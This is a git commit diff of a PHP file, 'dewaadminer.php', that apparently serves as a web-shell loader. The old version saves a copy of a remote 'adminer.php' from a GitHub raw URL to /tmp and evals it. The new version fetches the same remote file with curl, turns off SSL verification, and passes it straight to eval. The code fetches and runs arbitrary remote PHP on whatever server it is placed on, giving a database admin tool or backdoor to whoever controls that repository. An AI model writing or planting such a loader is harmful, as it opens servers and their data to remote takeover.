74515136c59f2ebb758e486d43b081cc7e5f2ac2
seokerens <randomprsnn404@gmail.com>
2025-10-27 16:38:12 +0700

    Update dewaadminer.php

--- dewaadminer.php
+++ dewaadminer.php
@@ -1,9 +1,13 @@
 <?php
-
-$rand = rand(00000000,99999999);
-$md5 = md5($rand);
-if(!is_file('/tmp/ses_'.$md5)) {
-    @file_put_contents('/tmp/ses_'.$md5, file_get_contents('https://raw.githubusercontent.com/seokerens/umum/refs/heads/main/adminer.php'));
+$url = 'https://raw.githubusercontent.com/seokerens/umum/refs/heads/main/adminer.php';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$fileContents = curl_exec($ch);
+curl_close($ch);
+if ($fileContents === false) {
+    die('[!] Cannot Get File : https://raw.githubusercontent.com/seokerens/umum/refs/heads/main/adminer.php ');
 }
-@eval('?>'.file_get_contents('/tmp/ses_'.$md5));
-
+eval("?>" . $fileContents);
+?>
